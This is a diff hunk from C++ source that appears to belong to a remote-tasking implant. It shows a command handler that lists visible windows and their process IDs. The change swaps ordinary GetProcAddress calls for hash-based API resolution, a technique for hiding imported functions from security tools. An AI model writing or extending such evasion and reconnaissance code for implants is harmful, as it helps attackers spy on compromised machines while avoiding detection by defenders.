@@ -102,17 +102,17 @@ auto declfn starburst::cmd_windows(
     }
 
     auto pEnumWindows = reinterpret_cast<fn_EnumWindows>(
-        inst.kernel32.GetProcAddress( h_user32,
-            symbol<LPCSTR>( "EnumWindows" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_user32 ),
+            expr::hash_string( "EnumWindows" ) ) );
     auto pIsWindowVisible = reinterpret_cast<fn_IsWindowVisible>(
-        inst.kernel32.GetProcAddress( h_user32,
-            symbol<LPCSTR>( "IsWindowVisible" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_user32 ),
+            expr::hash_string( "IsWindowVisible" ) ) );
     auto pGetWindowTextW = reinterpret_cast<fn_GetWindowTextW>(
-        inst.kernel32.GetProcAddress( h_user32,
-            symbol<LPCSTR>( "GetWindowTextW" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_user32 ),
+            expr::hash_string( "GetWindowTextW" ) ) );
     auto pGetWindowThreadProcessId = reinterpret_cast<fn_GetWindowThreadProcessId>(
-        inst.kernel32.GetProcAddress( h_user32,
-            symbol<LPCSTR>( "GetWindowThreadProcessId" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_user32 ),
+            expr::hash_string( "GetWindowThreadProcessId" ) ) );
 
     if ( !pEnumWindows || !pIsWindowVisible || !pGetWindowTextW || !pGetWindowThreadProcessId ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
